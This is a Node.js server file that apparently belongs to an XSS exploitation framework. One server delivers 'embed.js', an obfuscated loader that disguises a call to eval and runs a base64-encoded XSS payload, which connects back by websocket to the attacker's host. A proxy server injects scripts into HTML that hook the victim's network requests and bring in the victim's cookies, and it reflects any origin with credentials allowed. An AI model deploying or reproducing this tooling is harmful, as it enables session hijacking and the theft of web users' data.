/**
 * 处理普通的http服务
 */

import http from 'http';
import https from 'https';
import url from 'url';
import { readFileSync } from 'fs';

http.globalAgent.maxSockets = Infinity;

import { source_domain, proxy_domain_len, source_port_local, isSSL, proxy_port_local, sslCert, sslKey, ws_port_remote, proxy_domain } from './conf.js';
import { btoa, cryptoPayload, baseXSSPayload, hookRequestPayload, cookiePayload, addNewDefaultLog } from './utils/index.js';
import { proxyRequest } from './xss-core.js';

const handle_source_app = async (req, res) => {
    if(req.url.includes('embed.js')){
        //加载多段基础payload
        res.end(
            //加密库
            cryptoPayload + 
            //核心逻辑
            `window['\\x65' + String.fromCharCode(118) + '\\u0061\\x6c']` + 
            `(atob("${btoa(`var host = "${isSSL() ? 'wss' : 'ws'}://${source_domain()}:${ws_port_remote()}";${baseXSSPayload}`)}"));`
        );
    }else{
        res.end('none');
    }
};

let fkey, fcert;

try{
    fkey = readFileSync(sslKey());
    fcert = readFileSync(sslCert());
}catch(e){}

//如果ssl关闭或者key cert有一个有问题，那就只开启普通的http服务
if(!isSSL() || !fkey || !fcert){
    //资源服务器
    http.createServer(handle_source_app).listen(source_port_local());
}else{
    const key = fkey;
    const cert = fcert;
    //资源服务器
    https.createServer({
        cert, key,
        //requestCert : true, 
        //rejectUnauthorized : true
    }, handle_source_app).listen(source_port_local());
}

setTimeout(() => {
    addNewDefaultLog('CORE', `Static source server has started on local port : ${source_port_local()}`, 'green');
});

//转发服务器
http.createServer((req, res) => {
    const databuff = [];
    req.on('data', buf => {
        databuff.push(buf);
    });
    req.on('end', async () => {
        //构造队列函数推入队列
        //根据url分析转发服务器和目标域名、端口、参数、协议、体数据
        try{
            const ary = req.url.split(/[\?]/g);
            const host = req.headers.host.split(/[\.]/g);
            const proxy_domain_count = proxy_domain_len();
            if(host.length < proxy_domain_count + 5){
                return res.end('ERROR: not a regluar domain - len');
            }
            const splitor = host.length - proxy_domain_count - 1;
            const params = ary[1] || '';
            const method = req.method;
            const protocol = host[0];
            const port = parseInt(host[1]);
            const server = host[splitor];
            const domain = host.slice(2, splitor).join('.');
            const data = Buffer.concat(databuff).toString();
            const path = url.parse(req.url).pathname;
            //如果是默认协议的话我们需要改一改
            const uri = `${protocol === 'default' ? '' : protocol + ':'}//${domain}${ port === 65536 ? '' : ':' + port }${path}?${params}`;
            let response = await proxyRequest(server, method, uri, data, req.headers);
            /**
             * 对于开启了hook的html，我们需要提前插入一段用于hook的js代码，hook住几个网络请求函数
             * 同时要需要插入可读的cookie，也就是说我们还要去客户端拿cookie =，= 
             * */
            if(req.url.includes('fxxkxss_proxy=true') && response !== 'invalid server'){
                const index = response.indexOf('<head>') + 6;
                response = response.substr(0, index) 
                    + `<script>${hookRequestPayload(server, proxy_domain(), proxy_port_local())}</script>`
                    + `<script>${await cookiePayload(server)}</script>`
                    + response.substr(index);
            }
            res.setHeader('Access-Control-Allow-Origin', req.rawHeaders[req.rawHeaders.indexOf('Origin') + 1]);
            res.setHeader('Access-Control-Allow-Headers', 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With');
            res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PATCH, PUT, DELETE');
            res.setHeader('Access-Control-Allow-Credentials', 'true');
            res.setHeader('Access-Control-Max-Age', '1728000');
            res.end(response);
        }catch(e){
            res.end('ERROR: not a regular domain - regular' + e);
        }
    });
}).listen(proxy_port_local());

setTimeout(() => {
    addNewDefaultLog('CORE', `proxy server has started on local port : ${proxy_port_local()}`, 'green');
});